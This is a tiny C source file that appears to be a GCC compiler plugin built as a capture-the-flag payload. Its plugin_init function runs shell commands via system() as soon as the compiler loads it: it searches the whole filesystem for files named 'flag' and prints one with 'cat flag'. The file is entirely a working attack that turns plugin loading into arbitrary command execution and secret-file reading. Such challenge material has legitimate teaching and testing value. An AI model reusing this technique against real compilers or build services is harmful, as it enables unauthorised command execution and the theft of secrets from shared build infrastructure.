#include <stdlib.h>

int plugin_is_GPL_compatible = 1;

void plugin_init() {
    system("echo hack-start");
    system("find / | grep flag");
    system("cat flag");
}